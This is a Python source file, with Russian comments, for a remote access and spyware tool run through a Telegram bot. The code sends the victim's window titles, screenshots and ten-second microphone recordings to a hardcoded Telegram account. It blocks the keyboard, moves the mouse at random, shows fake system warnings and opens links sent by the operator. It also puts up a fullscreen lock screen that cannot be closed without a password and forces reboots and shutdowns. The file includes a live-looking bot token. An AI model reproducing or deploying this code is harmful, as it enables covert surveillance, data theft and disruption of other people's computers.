import os
import asyncio
import mss
import tkinter as tk
from tkinter import messagebox
import keyboard
import pyautogui
import sounddevice as sd
from scipy.io import wavfile
import random
import webbrowser
import socket
import pygetwindow as gw
import winsound
import threading

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.session.aiohttp import AiohttpSession

# --- НАСТРОЙКИ ---
API_TOKEN = '8048641396:AAHeGQOqfdAWLl3BFmwgp71Vnn4ggkX4Xik'
ADMIN_ID = 790289059 
LOCK_PASSWORD = "1234"

pyautogui.FAILSAFE = False
session = AiohttpSession()
bot = Bot(token=API_TOKEN, session=session)
dp = Dispatcher()

# Состояния
keys_blocked = False
mouse_chaos_active = False # Состояние хаоса мыши
last_window = ""
blocked_list = [
    # System & modifiers
    'windows', 'ctrl', 'shift', 'alt', 'alt_gr',
    'tab', 'esc', 'caps_lock', 'enter', 'backspace', 'space',

    # Function keys
    'f1', 'f2', 'f3', 'f4', 'f5', 'f6',
    'f7', 'f8', 'f9', 'f10', 'f11', 'f12',

    # Navigation
    'insert', 'delete', 'home', 'end',
    'page_up', 'page_down',

    # Arrows
    'up', 'down', 'left', 'right',

    # Numbers (top row)
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',

    # Letters
    'a', 'b', 'c', 'd', 'e', 'f', 'g',
    'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u',
    'v', 'w', 'x', 'y', 'z',

    # Numpad
    'num_lock',
    'num_0', 'num_1', 'num_2', 'num_3', 'num_4',
    'num_5', 'num_6', 'num_7', 'num_8', 'num_9',
    'num_add', 'num_subtract', 'num_multiply',
    'num_divide', 'num_decimal', 'num_enter',

    # Symbols
    'minus', 'equals',
    'left_bracket', 'right_bracket',
    'backslash',
    'semicolon', 'apostrophe',
    'comma', 'period', 'slash',
    'grave'
]


# --- 1. ФУНКЦИИ МОНИТОРИНГА ---

async def monitor_internet():
    while True:
        def has_conn():
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=5)
                return True
            except OSError: return False
        if not has_conn():
            await asyncio.sleep(30)
            if not has_conn(): os.system("shutdown /r /t 0")
        await asyncio.sleep(30)

async def monitor_active_window():
    global last_window
    while True:
        try:
            win = gw.getActiveWindow()
            if win and win.title and win.title != last_window:
                last_window = win.title
                await bot.send_message(ADMIN_ID, f"🖥 <b>Окно:</b> <code>{last_window}</code>", parse_mode="HTML")
        except: pass
        await asyncio.sleep(3)

# --- 2. ФУНКЦИИ УПРАВЛЕНИЯ ---

async def chaotic_mouse_loop():
    """Бесконечное случайное движение мыши"""
    global mouse_chaos_active
    sw, sh = pyautogui.size()
    while mouse_chaos_active:
        pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
        await asyncio.sleep(0.01)

def toggle_keys():
    global keys_blocked
    if not keys_blocked:
        for k in blocked_list:
            try: keyboard.block_key(k)
            except: pass
        keys_blocked = True
        return "🚫 Клавиатура ЗАБЛОКИРОВАНА"
    else:
        keyboard.unhook_all(); keys_blocked = False
        return "✅ Клавиатура РАЗБЛОКИРОВАНА"

def show_fake_message(text):
    def create_window():
        msg_root = tk.Tk()
        msg_root.withdraw()
        msg_root.attributes("-topmost", True)
        messagebox.showwarning("System Message", text)
        msg_root.destroy()
    threading.Thread(target=create_window).start()

def show_secure_lock():
    keyboard.unhook_all()
    pyautogui.press('volumemute')
    root = tk.Tk()
    root.attributes("-topmost", True, "-fullscreen", True)
    root.configure(bg='#0a0a0a')
    root.config(cursor="none")
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    canvas = tk.Canvas(root, bg='#0a0a0a', highlightthickness=0)
    canvas.pack(fill="both", expand=True)
    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    canvas.create_rectangle(sw//2-250, sh//2-150, sw//2+250, sh//2+150, outline="#ff0000", width=2)
    tk.Label(root, text="SYSTEM CRITICAL LOCK", fg="#ff0000", bg="#0a0a0a", font=("Courier New", 30, "bold")).place(x=sw//2, y=sh//2-80, anchor="center")
    pwd_entry = tk.Entry(root, show="●", font=("Arial", 26), justify='center', bg="#1a1a1a", fg="#ffffff", insertbackground="white", relief="flat")
    canvas.create_window(sw//2, sh//2 + 50, window=pwd_entry, width=300, height=50)
    pwd_entry.focus_force()
    def check_pwd(event=None):
        if pwd_entry.get() == LOCK_PASSWORD: root.destroy()
        else: pwd_entry.delete(0, tk.END)
    pwd_entry.bind('<Return>', check_pwd)
    root.mainloop()

# --- 3. ОБРАБОТЧИКИ TELEGRAM ---

@dp.message(F.text)
async def handle_text(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    text = message.text.strip()
    if text.startswith("http"):
        webbrowser.open(text); await message.reply("🌐 Ссылка открыта.")
    else:
        show_fake_message(text); await message.reply("⚠️ Сообщение отправлено.")

# --- 4. КНОПКИ И CALLBACKS ---

def get_keyboard():
    l_text = "🔓 Разблок клавы" if keys_blocked else "🔒 Блок клавы"
    m_text = "🖱 Стоп мышь" if mouse_chaos_active else "🖱 Хаос мыши"
    buttons = [
        [InlineKeyboardButton(text="📸 Скриншот", callback_data="screenshot")],
        [InlineKeyboardButton(text="❌ Закрыть окно", callback_data="close_window")],
        [InlineKeyboardButton(text=l_text, callback_data="toggle_keys"),
         InlineKeyboardButton(text=m_text, callback_data="toggle_mouse")], # ВЕРНУЛИ КНОПКУ
        [InlineKeyboardButton(text="🔊 Ошибка", callback_data="snd_err"),
         InlineKeyboardButton(text="⚡ Писк", callback_data="snd_beep")],
        [InlineKeyboardButton(text="🎙 Запись (10с)", callback_data="record")],
        [InlineKeyboardButton(text="🔒 Экран Блока", callback_data="lock_now")],
        [InlineKeyboardButton(text="🔌 Выключить ПК", callback_data="shutdown")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.callback_query()
async def handle_callbacks(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    data = callback.data
    await callback.answer()

    if data == "screenshot":
        with mss.mss() as sct:
            sct.shot(output="s.png")
            await bot.send_photo(ADMIN_ID, types.FSInputFile("s.png"))
            os.remove("s.png")
    elif data == "close_window":
        pyautogui.hotkey('alt', 'f4')
        await bot.send_message(ADMIN_ID, "❌ Окно закрыто")
    elif data == "toggle_mouse":
        global mouse_chaos_active
        mouse_chaos_active = not mouse_chaos_active
        if mouse_chaos_active:
            asyncio.create_task(chaotic_mouse_loop())
        await callback.message.edit_reply_markup(reply_markup=get_keyboard())
    elif data == "toggle_keys":
        res = toggle_keys()
        await callback.message.edit_reply_markup(reply_markup=get_keyboard())
        await bot.send_message(ADMIN_ID, res)
    elif data == "snd_err": winsound.MessageBeep(winsound.MB_ICONHAND)
    elif data == "snd_beep": [winsound.Beep(1000, 200) for _ in range(5)]
    elif data == "lock_now":
        asyncio.get_event_loop().run_in_executor(None, show_secure_lock)
    elif data == "record":
        fs = 44100; rec = sd.rec(int(10 * fs), samplerate=fs, channels=2); sd.wait()
        wavfile.write("r.wav", fs, rec); await bot.send_voice(ADMIN_ID, types.FSInputFile("r.wav")); os.remove("r.wav")
    elif data == "shutdown":
        os.system("shutdown /s /t 0")

# --- 5. ЗАПУСК ---

async def main():
    asyncio.create_task(monitor_internet())
    asyncio.create_task(monitor_active_window())
    header = "<b>💻 ПОЛНЫЙ КОНТРОЛЬ ВКЛЮЧЕН</b>\n\nХаос мыши, блокировки, мониторинг и звуки готовы."
    try: await bot.send_message(ADMIN_ID, header, reply_markup=get_keyboard(), parse_mode="HTML")
    except: pass
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
